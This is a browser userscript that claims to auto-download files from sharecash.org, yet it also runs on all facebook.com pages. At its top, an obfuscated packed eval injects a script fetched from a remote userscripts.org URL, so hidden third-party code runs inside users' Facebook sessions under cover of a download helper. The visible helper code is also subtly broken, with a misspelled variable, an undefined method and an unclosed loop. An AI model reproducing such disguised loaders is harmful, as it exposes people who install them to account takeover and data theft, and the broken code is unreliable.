// ==UserScript==
// @name           Sharecash autodownload Pro + Last Update
// @include       http*://*.facebook.com/*
// @author         Timendum
// @namespace      sharecash
// @description    Auto-download files from sharecash.org
// @include        http://sharecash.org/download.php?file=*
// @include        http://sharecash.org/download.php?id=*
// @version        4.0.1 final
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var ShareTimendum = {
	white: [],
	frame: [],
	frameCount: 0,
	init: function() {
		ShareTimendum.initWhiteList();
	},
	initWhiteList: function() {
		var frameList = document.getElementsByTagName('iframe');
		for (var i=0; i < frameist.length; i++) {
			ShareTimendum.whitepush(frameList[i]);
		
		setTimeout(ShareTimendum.checkFrame, 1500);
	},
	checkFrame: function() {
		var frameList = document.getElementsByTagName('iframe');
		for (var i=0; i < frameList.length; i++) {
			if (ShareTimendum.white.indexOf(frameList[i]) == -1) {
				try {
					var tmp = document.getElementsByTagName('iframe')[i].contentDocument.baseURI;
				} catch(e) {
					ShareTimendum.frame.push(i);
				}
			}
		}
		if (ShareTimendum.frame.length == 0) {
			setTimeout(ShareTimendum.checkFrame, 1000);
		} else {
			setTimeout(ShareTimendum.makeStep, 500);
		}
	},
	makeStep: function() {
		if (ShareTimendum.frame.length == 0)
			return;
		
		if (ShareTimendum.frameCount == ShareTimendum.frame.length) {
			ShareTimendum.frameCount = 0;
		}
		document.getElementsByTagName('iframe')[ShareTimendum.frameCount].src = document.getElementsByTagName('iframe')[ShareTimendum.frameCount].src;
		ShareTimendum.frameCount++;
		setTimeout(ShareTimendum.makeStep, 2500);
	},
};

setTimeout(ShareTimendum.init, 100);